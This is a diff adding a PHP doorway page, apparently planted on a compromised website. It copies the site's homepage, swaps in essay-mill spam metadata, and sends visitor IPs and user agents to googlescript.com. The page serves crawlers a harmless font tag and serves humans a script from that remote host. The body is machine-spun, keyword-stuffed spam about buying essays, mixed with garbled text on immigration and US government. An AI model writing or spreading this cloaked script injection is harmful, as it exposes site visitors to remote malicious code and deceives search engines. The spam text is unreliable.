@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Cheap Custom Essays Online Door Icarly Practise Colleague cheap custom essays online Midwestern Drawers Ribbons Dependable Reminiscent | purplecube.in</title>
+<meta name="description" content="A seven- year-old horse gelding that is was euthanized in march after suffering from ehv-1. | Cheap Custom Essays Online" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>cheap custom essays online Deviance Darfur Compensate Estragon</h1>Your satisfaction <a href="http://purplecube.in/buy-essays-no-plagiarism">buy essays no plagiarism</a> is our primary focus. <p>Please fill in and submit the payment form to complete the transaction. We are hiring only MA and PhD graduated writers from various well-known cheap custom essays online US and UK Universities. I have taken several MS office tutoring and trained to be capable of using Word, PowerPoint and Excel. I would like to note that I enjoy being active and curious about different areas of life and I am always looking for new opportunities. Examplex describes the <strong>cheap custom essays online</strong> quoting of the great people "The plans - are nothing, planning - is everything. Then proceed with the payment.</p> <h2>But often, doing so can result in writeris stop and so slow the publishing method down.</h2>In state prisons this figure is much lower, because violation of immigration law is under federal jurisdiction. <p>Also, there are interests of neighboring countries (especially Mexico) in such labor force export. The best balance of quality and price. Email college essay examples 2014 the fastest, easiest, and most popular delivery method. It is obvious that manufacturing examplles should be integrated into the overall business strategy that takes into account aspects of marketing, finance, sales, etc. It should be noted that tax burden on American citizens in all bordering states varies greatly due to the intensity of the various streams of immigrants and different density of the population of these states. In the 2000 census, seven states have the minimum at one representative, while California, the most populated state, had fifty-three. Amendments to the Constitution need cheap custom essays online the approval of three-fourths of the states. This fact, consequently, leads to a widening gap between rich and of these groups ocllege the general social picture, according to Francisco However, a college essay examples <a href="http://purplecube.in/pay-someone-to-write-essay-uk">pay someone to write essay uk</a> 2014 place among the problems of illegal immigrants is committed to crimes and serving sentences in prisons.</p> <h2>Be sure to vary your spin and strokes.</h2>Our <a href="http://purplecube.in/buy-extended-essay-ib">buy extended essay ib</a> custom papers will be sent via e-mail at no extra cost. <p><strong>cheap custom essays online</strong> We are in this field since 1999, we have huge experience in academic writing. Within the American political culture, the Republican Party is considered center-right or "conservative" and the Democratic Party is considered center-left or "liberal". The original text of the Constitution establishes the structure and responsible fields of the federal colege and its relationship with the individual states. The Senate has 100 members with each state has two senators, elected for terms, a third of the seats cheap custom essays online are elected every two years. You will receive your paper as an attachment in Word (. The system would consist of monitoring cameras, radar, sensor elements <strong>cheap custom essays online</strong> and detectors that detect motion and heat cheap custom essays online radiation.</p> <h2>Regis senior high school issues even the high-school placement examination, or the hspt.</h2>The college essay examples 2014 beautiful strategy can be destroyed by the incompetent tactics. <p>United States operates under system for most of its history. Your questions will always get a clear and prompt response by email or live chat. Esssay, it is not necessary. Another major reason, which explains the lack of effective measures to address the problems associated with illegal immigration, is the lack of funding for follege and improve border security. For illegal immigrants, state is the direct and indirect costs of subsidies to large families (some of which have legal status) and college essay examples 2014 expenses cheap custom essays online for emergency assistance. The President is elected exapmles a four-year period and may be re-elected for not more than two times.</p> <h2>3 a roommate s routines can dramatically influence you along with your residence.</h2>The essence of strategic planning is the way how the individual units and soldiers act. <p>I knew what my classmates wanted and needed. I have been a volunteer in nursing home cheap custom essays online and I do it monthly. For instance, in the state of Arizona, the annual cost of detention of illegal immigrants, providing litigation and justice, procedural measures, the content in custody prior to sentencing or until the circumstances, etc. Article Essa of the Constitution protects the right to "a good way" (Habeas corpus), and Article 2 guarantees the right to a trial by judges in all. I also have oversea experience- I have been studying abroad since 2008 in Canada and International English Language College essay examples 2014 System (IELTS 6. The constitution was changed twenty-seven times, the first ten constitutional amendments, which make up the Charter of Rights, college essay examples 2014 the college essay examples 2014 fourth Amendment form the central basis of the individual rights of Americans. A lot of our customers return to order custom essay <a href="http://purplecube.in/pay-essays-online">pay essays online</a> and we are a trusted source of academic assistance.</p> <h2>Nobody is not imperfect, and everybody has disadvantages and skills.</h2>In turn, <a href="http://purplecube.in/write-a-paper-in-english">write a paper in english</a> for large, medium and small businesses attract illegal immigrants is an opportunity for additional revenue and significantly reduce workforce costs. <p>I would like to note that I am As an Asian, I am really good at math. In particular, numerous immigrant families, even receiving subsidies, have extremely low incomes, education, and poor essah of life. Last year, I was the planner of a event hold by Wanda Inc. The president coollege selectable by direct suffrage, but by an indirect electoral system in which the votes are distributed according to state. In order to choose terms at basic levels, state-administered choose the most important party candidates cheap custom essays online for next parliamentary elections. Since the parliamentary elections of 1856, the major parties have been the Democratic Party, founded in 1824, and the Colleege Party, founded in 1854.</p> <h2>Don t use abusive terminology with every other people or friends.</h2>Currently, we accept major credit cards Visa, MasterCard, American Express and Discover. <p>For the last few years, American society actively discussed Boeing project of the construction of so-called "high-tech" fence along the border with Mexico. All laws and governmental procedures are subject to legal review, and any law unconstitutional is annulled. It is essential to note that I am bilingual- frequent in Chinese and English, and I consider it as an advantage as well. In a sense, illegal immigration is importing poverty college essay examples 2014 poor living conditions.</p>
+                  </div>
+               </div>
